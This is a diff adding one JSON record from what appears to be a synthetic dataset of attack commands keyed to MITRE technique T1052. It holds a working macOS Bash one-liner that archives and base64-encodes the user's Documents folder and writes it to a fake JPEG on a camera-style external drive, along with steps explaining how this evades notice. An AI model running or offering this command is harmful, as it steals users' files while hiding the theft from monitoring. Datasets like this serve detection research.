@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar -czf - \"$HOME/Documents\" | base64 | dd of=\"/Volumes/CANON_DC/DCIM/100CANON/IMG_4021.JPG\" bs=1m conv=sync && sync",
+  "explanation": "Encodes an archive of Documents as base64 and writes it to a JPEG-named file in a camera-style DCIM folder on the external drive using dd.",
+  "rationale_steps": [
+    "Archive Documents to reduce size and consolidate.",
+    "Base64-encode to appear as text while hiding binary signature.",
+    "Write to a camera-like directory path to blend in on removable media.",
+    "Sync to commit data for offline transport."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-24937b47-4dcaa55f",
+  "source_prompt_hash": "24937b47",
+  "timestamp_utc": "2025-09-30T05:19:16.168507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
